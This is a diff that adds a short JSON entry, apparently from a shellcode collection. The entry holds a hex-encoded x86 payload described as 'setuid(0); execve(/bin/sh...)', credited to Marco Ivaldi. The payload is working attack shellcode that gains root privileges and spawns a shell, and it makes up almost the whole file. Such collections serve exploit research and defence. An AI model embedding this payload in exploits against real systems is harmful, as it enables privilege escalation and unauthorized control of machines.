@@ -1,0 +1,5 @@
+{
+	"description" : "setuid(0); execve(/bin/sh,[/bin/sh,null,null],null)",
+	"author"      : "Marco Ivaldi <raptor@0xdeadbeef.info>",
+	"code"        : "31c05050b017cd8031c05068//sh68/bin89e350545350b03bcd80"
+}
